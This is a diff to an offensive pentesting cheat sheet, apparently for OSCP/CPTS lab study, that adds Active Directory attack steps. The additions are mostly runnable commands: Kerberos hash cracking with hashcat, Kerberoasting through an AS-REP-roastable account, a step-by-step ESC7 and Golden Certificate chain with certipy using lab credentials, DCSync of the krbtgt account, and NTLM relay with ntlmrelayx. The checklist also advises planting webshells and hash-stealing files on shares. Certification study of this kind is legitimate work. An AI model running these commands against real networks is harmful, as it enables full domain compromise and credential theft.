@@ -6,22 +6,23 @@ tags: [OSCP, CPTS, Methodology, Cheat Sheet, Active Directory, Pentesting]
 toc: true
 ---
 
-## Checklist : 
+## Quick Linux Checklist : 
 
-### Linux :
 
 - **Before having access :**
-- **Do nmap scan .**
+- **Scanning using Rustcan , nmap ...**
 - **If you dont find a web app , just know the path is an outdated Service .**
-- **always check versions first , if we find web :**
+- **always check versions first, Unsual service? Check Hacktricks,PentestBook,Pentest Everthing...**
+- **if we find web :**
 - **Find Directories + subdomains + files .**
-- **If you find Tomcat , there is a way to Pentest it Down there .**
+- **If you find a CMS,Tomcat,Jenkins or any Common APP... , there is a way to Pentest in Web Methodology .**
 - **check version inside web side found as well .**
 - **If we find a login page = try Auth bypass via SQL Injection .**
 - **Find parameter inside the URL : LFI + SQLi .**
 - **Check if you find an Upload Page , try different File Upload Bypasses .**
 - **If you find Node-ExpressJS check for /Graphql , maybe it can lead to a SQLI .**
 - **Found a git endpoint , check git section below**
+- **If you find Nothing for Web , check My Web Pentesting Methodology , waay more detailed.**
 - **Once inside :**
 - **Stabilize Shell First**
 - **Check Quick wins on Cheat Sheet .**
@@ -339,6 +340,9 @@ hashcat -m 2100 Helly.DC02 /usr/share/wordlists/rockyou.txt
 
 # TGS with AES 128 :
 hashcat -m 19700 hashesss /usr/share/wordlists/rockyou.txt
+
+# TGT : 
+hashcat -m 18200 Hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
 
 ***** Cracking RULES ******
 
@@ -792,6 +796,9 @@ if you get access , Look for usernames using netexec , --rid-brute , --users and
 - **If you compromise a Web admin always upload a webshell to get execute commands as the webserver (might have SE Impersonate)**
 - **Found Write Privileges on a Share , upload an INK file to steal Hashes (more details in share section)**
 - **If we find a WMI file , extract it locally and try getting the DPAPI encrypted Creds (More details in WMI/DPAPI section)**
+- **If we can't Crack the ASREP Hash , use it for Kerberoasting (Valid usernames needed , more info in Kerberoasting section)**
+- **If we can't crack an NTLMV2 Hash ,Relay it (Check Relay Section)**
+- **If we have Admin Over the CA Machine, Try ESC7 or Golden Certificate (check cert abuse section)**
 
 ### Without Credentials :
 
@@ -960,6 +967,9 @@ john --wordlist=/wordlists  Hash .
 this will check kerberoastable users using netexec . 
 
 netexec ldap $target -u 'users_list.txt' -p '' -k --asreproast asrep.txt . 
+
+# Kerberoasting using an ASREPROASTABLE user : Need a list of usernames , and the TGT for a user with no Pre_auth
+impacket-GetUserSPNs -no-preauth t.spivey tri.lab/ -dc-ip $DC_IP  -usersfile Valid_Users  -outputfile kerb_hash
 
 ```
 
@@ -1170,6 +1180,49 @@ impacket-secretsdump 'DC01$'@$target -hashes :57867e655d1abc9f45fd6e954e351531
 
 ```
 
+```bash
+
+==> If we got Admin rights on the CA Machine : ESC7 or Golden Cert attacks are both an option :
+
+******** ESC7 : *******
+
+# 1. Add yourself as officer (Manage CA → officer role)
+certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -add-officer m.pearson
+
+# 2. Enable SubCA template
+certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -enable-template SubCA
+
+# 3. Request cert for DA (will fail, save private key when prompted!)
+certipy-ad req -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -template SubCA -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109
+
+# 4. Approve your own denied request
+certipy-ad ca -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -issue-request <ID>
+
+# 5. Retrieve the cert
+certipy-ad req -u m.pearson -p 2silver -ns $DC_IP -dc-ip $DC_IP -target SWIM-SRV.tri.lab -ca tri-CA -retrieve <ID>
+
+# 6. Authenticate using the Certificate :
+certipy-ad auth -pfx j.reed_adm.pfx -dc-ip $DC_IP -username j.reed_adm -domain tri.lab
+
+# 7. DCSync
+impacket-secretsdump tri.lab/j.reed_adm@RUN-SRV.tri.lab -hashes :NTHASH -just-dc-user krbtgt
+
+****** Golden Certificate ******
+
+ # 1. Backup the CA certificate and private key
+certipy-ad ca -backup -ca 'tri-CA' -username m.pearson@tri.lab -password 2silver -dc-ip $DC_IP -target SWIM-SRV.tri.lab
+
+# 2. Forge a certificate offline for DA using stolen CA key
+certipy-ad forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 -crl ldap:///
+
+# 4. Authenticate with forged cert and get NT hash
+certipy-ad auth -pfx j.reed_adm_forged.pfx -dc-ip $DC_IP -username j.reed_adm -domain tri.lab
+
+# 5. DCSync for krbtgt
+impacket-secretsdump tri.lab/j.reed_adm@RUN-SRV.tri.lab -hashes :NTHASH -just-dc-user krbtgt
+
+```
+
 ### PowerShell Passwords Extraction :
 
 ```powershell
@@ -1257,6 +1310,17 @@ xp_dirtree \\KaliIP\Share
 On Kali : responder -I  tun0 -A -v 
 ```
 
+### NTLM Relay :
+
+```bash
+==> First get all machines with No Smb Signing :
+nmap -p 139,445 --script smb-security-mode,smb2-security-mode -Pn -iL targets
+nxc smb targets  --gen-relay-list relay_targets.txt
+
+==> Use NTLM Relay to relay the Hash to one of those machines :
+impacket-ntlmrelayx -smb2support -t targets
+
+```
 ### Blood Hound :
 
 ```bash
